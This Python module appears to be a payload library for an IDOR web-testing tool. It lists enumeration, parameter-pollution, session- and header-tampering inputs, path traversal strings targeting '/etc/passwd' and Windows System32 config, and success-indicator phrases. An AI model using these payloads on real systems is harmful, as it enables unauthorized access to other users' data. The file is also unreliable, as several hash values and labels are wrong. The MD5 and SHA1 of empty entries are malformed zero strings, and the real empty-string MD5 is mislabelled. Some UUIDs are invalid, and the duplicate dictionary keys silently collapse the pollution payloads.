"""
Advanced IDOR Payloads

Payloads for Insecure Direct Object Reference advanced attacks including:
- UUID predictability
- Email-based IDOR
- Parameter pollution
- Sequential ID bypass
"""

# UUID-based IDOR attacks
IDOR_UUID = [
    {
        "name": "uuid_00001",
        "payload": "00000000-0000-0000-0000-000000000001",
        "description": "UUID v1 predictable start",
    },
    {
        "name": "uuid_00002",
        "payload": "00000000-0000-0000-0000-000000000002",
        "description": "UUID v1 second value",
    },
    {
        "name": "uuid_increment",
        "payload": "550e8400-e29b-41d4-a716-4466554400001",
        "description": "Increment UUID last digits",
    },
    {
        "name": "uuid_decrement",
        "payload": "550e8400-e29b-41d4-a716-4466554399999",
        "description": "Decrement UUID last digits",
    },
    {
        "name": "uuid_null",
        "payload": "00000000-0000-0000-0000-000000000000",
        "description": "Null UUID",
    },
]

# Email-based IDOR
IDOR_EMAIL = [
    {
        "name": "email_enumeration",
        "payload": {"email": "user1@target.com"},
        "description": "Email enumeration",
    },
    {
        "name": "email_variation",
        "payload": {"email": "user+1@target.com"},
        "description": "Email plus variation",
    },
    {
        "name": "email_dot",
        "payload": {"email": "u.s.e.r@target.com"},
        "description": "Email dot trick",
    },
    {
        "name": "email_case",
        "payload": {"email": "User@target.com"},
        "description": "Email case sensitivity",
    },
]

# Parameter pollution for IDOR
IDOR_POLLUTION = [
    {
        "name": "id_array",
        "payload": {"id[]": "123", "id[]": "456"},
        "description": "Array notation IDOR",
    },
    {
        "name": "id_duplicate",
        "payload": {"id": "123", "id": "456"},
        "description": "Duplicate ID parameter",
    },
    {
        "name": "user_id_pollution",
        "payload": {"user_id": "123", "user_id": "99999"},
        "description": "User ID pollution",
    },
    {
        "name": "account_id_pollution",
        "payload": {"account_id": "victim", "account_id": "attacker"},
        "description": "Account ID pollution",
    },
]

# Hash-based IDOR
IDOR_HASH = [
    {
        "name": "md5_zero",
        "payload": "00000000000000000000000000000000000",  # MD5 of empty
        "description": "MD5 hash of empty string",
    },
    {
        "name": "md5_zero_length",
        "payload": "d41d8cd98f00b204e9800998ecf8427e",
        "description": "MD5 of '0'",
    },
    {
        "name": "sha1_zero",
        "payload": "0000000000000000000000000000000000000000000000",  # SHA1 of empty
        "description": "SHA1 hash of empty string",
    },
    {
        "name": "sha256_zero",
        "payload": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",  # SHA256 of empty
        "description": "SHA256 hash of empty string",
    },
]

# Base64 encoded IDOR
IDOR_BASE64 = [
    {
        "name": "b64_admin",
        "payload": "YWRtaW4=",  # admin
        "description": "Base64 encoded admin",
    },
    {
        "name": "b64_root",
        "payload": "cm9vdA==",  # root
        "description": "Base64 encoded root",
    },
    {
        "name": "b64_true",
        "payload": "dHJ1ZQ==",  # true
        "description": "Base64 encoded true",
    },
    {
        "name": "b64_id",
        "payload": "aWQ9MQ==",  # id=1
        "description": "Base64 encoded id=1",
    },
]

# URL encoding for IDOR
IDOR_URL_ENCODED = [
    {
        "name": "double_encode",
        "payload": "%2569%2564=",  # Double encoded id=
        "description": "Double URL encoded",
    },
    {
        "name": "unicode_escape",
        "payload": "\\u0069\\u0064\\u003d\\u0031",  # id=1 in Unicode
        "description": "Unicode escape bypass",
    },
    {
        "name": "mixed_case",
        "payload": {"ID": "1"},
        "description": "Mixed case parameter name",
    },
]

# Negative ID IDOR
IDOR_NEGATIVE = [
    {
        "name": "negative_id",
        "payload": {"id": -1},
        "description": "Negative ID",
    },
    {
        "name": "zero_id",
        "payload": {"id": 0},
        "description": "Zero ID",
    },
    {
        "name": "large_negative_id",
        "payload": {"id": -999999},
        "description": "Large negative ID",
    },
    {
        "name": "float_id",
        "payload": {"id": 1.5},
        "description": "Float ID",
    },
]

# Session-based IDOR
IDOR_SESSION = [
    {
        "name": "session_id",
        "payload": {"session_id": "attacker_session"},
        "description": "Session ID manipulation",
    },
    {
        "name": "token_enumeration",
        "payload": {"token": "test_token_1", "token": "test_token_2"},
        "description": "Token enumeration",
    },
    {
        "name": "csrf_token_bypass",
        "payload": {"csrf_token": "", "csrf_token": "bypassed"},
        "description": "CSRF token bypass",
    },
    {
        "name": "auth_header",
        "payload": {"Authorization": "Bearer attacker_token"},
        "description": "Authorization header manipulation",
    },
]

# Path-based IDOR
IDOR_PATH = [
    {
        "name": "directory_traversal",
        "payload": {"file": "../../../etc/passwd"},
        "description": "Path traversal IDOR",
    },
    {
        "name": "absolute_path",
        "payload": {"file": "/etc/passwd"},
        "description": "Absolute path IDOR",
    },
    {
        "name": "windows_path",
        "payload": {"file": "C:\\Windows\\System32\\config"},
        "description": "Windows absolute path",
    },
    {
        "name": "url_path",
        "payload": {"url": "/admin/users/123/profile"},
        "description": "URL path IDOR",
    },
]

# IDOR success indicators
IDOR_SUCCESS = [
    "Access granted",
    "Account details",
    "User profile",
    "Personal information",
    "Admin panel",
    "Dashboard",
    "Unauthorized access",
    "Different user data",
]

# Common IDOR parameters
IDOR_PARAMETERS = [
    "id",
    "user_id",
    "account_id",
    "order_id",
    "invoice_id",
    "document_id",
    "file_id",
    "message_id",
    "post_id",
    "comment_id",
    "profile_id",
    "session_id",
    "token",
    "uid",
    "email",
    "username",
]
